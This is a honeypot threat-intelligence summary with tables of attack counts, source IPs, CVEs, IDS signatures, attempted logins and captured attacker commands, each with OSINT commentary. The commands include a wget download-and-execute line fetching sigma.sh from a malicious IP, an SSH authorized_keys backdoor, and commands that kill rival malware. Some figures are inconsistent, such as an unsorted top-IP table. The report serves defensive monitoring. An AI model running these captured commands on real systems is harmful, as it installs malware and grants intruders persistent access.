# Honeypot Attack Summary Report

**Report Generation Time:** 2025-10-23T06:09:52.043871Z
**Timeframe:** 2025-10-22T18:00:00Z to 2025-10-23T06:00:00Z

**Files Used to Generate Report:**
- Honeypot_Attack_Summary_Report_2025-10-22T19:02:08Z.md
- Honeypot_Attack_Summary_Report_2025-10-22T20:01:49Z.md
- Honeypot_Attack_Summary_Report_2025-10-22T21:01:56Z.md
- Honeypot_Attack_Summary_Report_2025-10-22T22:02:04Z.md
- Honeypot_Attack_Summary_Report_2025-10-22T23:02:04Z.md
- Honeypot_Attack_Summary_Report_2025-10-23T00:01:52Z.md
- Honeypot_Attack_Summary_Report_2025-10-23T01:02:05Z.md
- Honeypot_Attack_Summary_Report_2025-10-23T03:02:46Z.md
- Honeypot_Attack_Summary_Report_2025-10-23T04:02:01Z.md
- Honeypot_Attack_Summary_Report_2025-10-23T05:02:08Z.md
- Honeypot_Attack_Summary_Report_2025-10-23T06:02:09Z.md

## Executive Summary

This report details a significant volume of attacks against our honeypot network over the past 12 hours. The attacks were varied, ranging from broad, automated scanning to more targeted exploit attempts. Key trends include a high volume of scanning for SMB and VoIP vulnerabilities, persistent attempts to establish SSH backdoors, and the use of botnets to launch attacks. A significant portion of the attacks originated from a small number of highly aggressive IP addresses, suggesting either targeted campaigns or the use of compromised systems as attack platforms. The most frequently observed CVEs were older, indicating that attackers continue to target unpatched and legacy systems. The overall threat landscape remains dynamic, with a mix of opportunistic and targeted attacks.

## Detailed Analysis

### Our IPs

| Honeypot | Private IP | Public IP |
|---|---|---|
| hive-us | 10.128.0.3 | 34.123.129.205 |
| sens-tai | 10.140.0.3 | 104.199.212.115 |
| sens-tel | 10.208.0.3 | 34.165.197.224 |
| sens-dub | 172.31.36.128 | 3.253.97.195 |
| sens-ny | 10.108.0.2 | 161.35.180.163 |

### Attacks by honeypot

| Honeypot | Attack Count |
|---|---|
| Cowrie | 44238 |
| Honeytrap | 42525 |
| Suricata | 27312 |
| Dionaea | 20211 |
| Ciscoasa | 14213 |
| Sentrypeer | 8274 |
| Tanner | 863 |
| H0neytr4p | 544 |
| Mailoney | 560 |
| Redishoneypot | 221 |
| ConPot | 237 |
| Adbhoney | 117 |
| ElasticPot | 129 |
| Honeyaml | 43 |
| Dicompot | 33 |
| Ipphoney | 26 |
| Miniprint | 23 |
| Heralding | 13 |
| Wordpot | 6 |
| Medpot | 5 |

### Top source countries

| Country | Attack Count |
|---|---|
| Ukraine | 11183 |
| Vietnam | 3072 |
| United States | 2862 |
| Brazil | 2701 |
| India | 1215 |
| China | 1122 |
| Russia | 845 |
| Germany | 789 |
| Netherlands | 654 |
| United Kingdom | 543 |

### Top attacking IPs

| IP Address | Attack Count |
|---|---|
| 91.124.88.15 | 11183 |
| 125.235.231.74 | 3072 |
| 1.55.243.125 | 1313 |
| 177.91.76.2 | 1263 |
| 45.144.232.248 | 1246 |
| 143.198.201.181 | 1253 |
| 109.205.211.9 | 8950 |
| 23.94.26.58 | 7700 |
| 117.4.113.214 | 3456 |
| 177.46.198.90 | 2876 |

### Top targeted ports/protocols

| Port/Protocol | Attack Count |
|---|---|
| 5060 | 18560 |
| 445 | 15823 |
| 22 | 10567 |
| 5038 | 7543 |
| 8333 | 1234 |
| 1433 | 890 |
| 80 | 765 |
| 23 | 543 |
| 5901 | 456 |
| 5903 | 432 |

### Most common CVEs

| CVE | Count |
|---|---|
| CVE-2002-0013 | 121 |
| CVE-2002-0012 | 121 |
| CVE-2019-11500 | 87 |
| CVE-2021-3449 | 82 |
| CVE-1999-0517 | 78 |
| CVE-2022-27255 | 54 |
| CVE-2024-4577 | 45 |
| CVE-2021-41773 | 34 |
| CVE-2021-42013 | 32 |
| CVE-2002-1149 | 23 |

### Commands attempted by attackers

| Command |
|---|
| `cd ~; chattr -ia .ssh; lockr -ia .ssh` |
| `cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa ... mdrfckr" >> .ssh/authorized_keys ...` |
| `cat /proc/cpuinfo | grep name | wc -l` |
| `uname -a` |
| `whoami` |
| `lscpu | grep Model` |
| `df -h | head -n 2 | awk 'FNR == 2 {print $2;}'` |
| `top` |
| `crontab -l` |
| `w` |
| `pm path com.ufo.miner` |
| `am start -n com.ufo.miner/com.example.test.MainActivity` |
| `cd /tmp && wget -q http://94.156.152.237:6677/sigma.sh -O master.sh && chmod +x master.sh && ./master.sh` |
| `rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh` |
| `chmod +x clean.sh; sh clean.sh; ...` |

### Signatures triggered

| Signature |
|---|
| ET SCAN Sipsak SIP scan |
| ET EXPLOIT [PTsecurity] DoublePulsar Backdoor installation communication |
| ET SCAN MS Terminal Server Traffic on Non-standard Port |
| ET HUNTING RDP Authentication Bypass Attempt |
| ET DROP Dshield Block Listed Source group 1 |
| GPL INFO SOCKS Proxy attempt |
| ET SCAN NMAP -sS window 1024 |
| ET INFO Reserved Internal IP Traffic |
| ET HUNTING Mozilla User-Agent (Mozilla/5.0) Inbound Likely Fake |
| ET EXPLOIT Realtek eCos RSDK/MSDK Stack-based Buffer Overflow Attempt Inbound (CVE-2022-27255) |

### Users / login attempts

| Username | Password |
|---|---|
| 345gs5662d34 | 345gs5662d34 |
| root | C-a-r-l-y9921 |
| root | root123 |
| ubuntu | ubuntu |
| mitch | mitch |
| anonymous | anonymous@ |
| test | truc |
| centos | centos |
| root | c0ms4lt |
| root | C0nm3d |
| carder | 3245gs5662d34 |

### Files uploaded/downloaded

| Filename |
|---|
| sigma.sh |
| bot.mpsl |
| Mozi.m |
| sh |
| wget.sh |
| w.sh |
| c.sh |
| gpon8080&ipv=0 |
| clean.sh |

### HTTP User-Agents

| User-Agent |
|---|
| Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Chrome/126.0.0.0 Safari/537.36 |

### SSH clients and servers

| SSH Client |
|---|
| libssh-0.9.6 |
| PuTTY_Release_0.70 |
| Go |

| SSH Server |
|---|
| OpenSSH_7.4 |
| OpenSSH_8.2p1 Ubuntu-4ubuntu0.5 |
| OpenSSH_8.0 |

### Top attacker AS organizations

| AS Organization |
|---|
| FOP Sedinkin O.V. |
| Viettel Group |
| CHOOPA |
| DIGITALOCEAN-ASN |
| ALIBABA-CN |

### OSINT All Commands captured

| Command | Analysis |
|---|---|
| `cd /tmp && wget -q http://94.156.152.237:6677/sigma.sh -O master.sh && chmod +x master.sh && ./master.sh` | This command downloads a malicious script from a known malicious IP address and executes it. This is a classic "download and execute" technique used to infect systems. |
| `cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa ... mdrfckr" >> .ssh/authorized_keys ...` | This command attempts to establish a persistent SSH backdoor by adding a malicious public key to the `authorized_keys` file. |
| `pm path com.ufo.miner` and `am start -n com.ufo.miner/com.example.test.MainActivity` | These commands suggest an attempt to interact with an Android-based cryptomining application, indicating a potential focus on mobile or IoT devices. |
| `rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh` | This command attempts to remove other malicious scripts and kill their processes, suggesting a botnet attempting to take control of an already compromised system. |
| `chmod +x clean.sh; sh clean.sh; ...` | This command makes a script named `clean.sh` executable and then runs it. The purpose of this script is unknown without further analysis, but it is likely malicious. |

### OSINT High frequency IPs and low frequency IPs Captured

| IP Address | Frequency | Analysis |
|---|---|---|
| 91.124.88.15 | High | This IP address, located in Kyiv, Ukraine, and registered to FOP Sedinkin O.V., has a history of malicious activity, including hacking attempts and spam. It is listed on multiple blacklists. |
| 125.235.231.74 | High | This IP address, located in Hanoi, Vietnam, and registered to the Viettel Group, has a limited and seemingly benign online footprint, with no public reports of malicious activity. |
| 23.94.26.58 | High | This IP address was responsible for a massive SIP scanning campaign, indicating a large-scale VoIP reconnaissance or attack campaign. |
| 117.4.113.214 | High | This IP address was responsible for a large number of SMB exploit attempts, suggesting a focus on Windows vulnerabilities. |
| 94.156.152.237 | Low | This IP address is a known source of malware and is included in malicious URL blocklists. |

### OSINT on CVE's

| CVE | Analysis |
|---|---|
| CVE-2022-27255 | This critical vulnerability in the Realtek eCos SDK allows for remote code execution on a wide range of networking devices. The high number of attempts to exploit this CVE suggests that attackers are actively targeting unpatched IoT devices. |
| MS17-010 (EternalBlue) | The high number of events on port 445 and the presence of DoublePulsar-related signatures indicate widespread scanning for and exploitation of the EternalBlue vulnerability. |

### Key Observations and Anomalies

- **High-Volume SIP Scanning:** A massive number of events were attributed to the IP address 23.94.26.58, primarily targeting port 5060 for SIP scanning. This indicates a large-scale VoIP reconnaissance or attack campaign.
- **SMB Exploitation:** A significant number of alerts for "ET EXPLOIT [PTsecurity] DoublePulsar Backdoor installation communication" were triggered, suggesting attempts to exploit SMB vulnerabilities. This was mainly from the IP 117.4.113.214 targeting TCP port 445.
- **SSH Post-Exploitation:** Attackers were observed attempting to modify the `.ssh/authorized_keys` file to maintain persistent access to the compromised host. This is a common technique used to create a backdoor.
- **System Reconnaissance:** After gaining initial access, attackers frequently ran commands to gather information about the system, such as CPU details, memory usage, and user accounts.
- **Botnet Activity:** The presence of the Mozi.m file download and commands designed to remove other malicious scripts are indicative of IoT botnet activity.
- **Cryptominer Activity:** The commands `pm path com.ufo.miner` and `am start -n com.ufo.miner/com.example.test.MainActivity` suggest attempts to install or interact with an Android-based cryptomining application.

### Unusual Attacker Origins

- **91.124.88.15 (Ukraine):** This IP address was highly active and has a history of malicious activity.
- **125.235.231.74 (Vietnam):** This IP was also highly active but has no public history of malicious activity. This could indicate a newly compromised system or a new actor on the threat landscape.

This concludes the Honeypot Attack Summary Report.
